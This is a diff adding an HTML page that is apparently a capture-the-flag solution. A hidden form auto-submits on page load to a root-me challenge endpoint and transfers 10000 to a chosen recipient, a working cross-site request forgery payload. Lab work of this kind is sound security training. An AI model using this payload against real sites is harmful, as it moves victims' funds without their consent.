@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Transfert en cours...</title>
+  </head>
+  <body>
+    <form id="csrf-form" action="https://instance-019d004f-9452-7071-b88e-b604f65a28ea.challenges.root-me.pro/transfer" method="POST">
+      <input type="hidden" name="recipient" value="test" />
+      <input type="hidden" name="amount" value="10000" />
+    </form>
+
+    <script>
+      // Soumission automatique du formulaire dès que la page est chargée
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
